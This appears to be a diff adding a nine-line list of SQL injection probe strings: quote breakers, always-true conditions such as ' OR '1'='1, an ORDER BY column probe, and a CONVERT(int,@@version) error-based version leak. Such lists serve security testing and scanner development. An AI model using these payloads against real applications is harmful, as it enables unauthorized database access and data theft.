@@ -1,0 +1,9 @@
+'
+"
+')
+';--
+' OR '1'='1
+' OR 1=1-- -
+" OR "1"="1
+1' ORDER BY 1-- -
+' AND 1=CONVERT(int,@@version)-- -
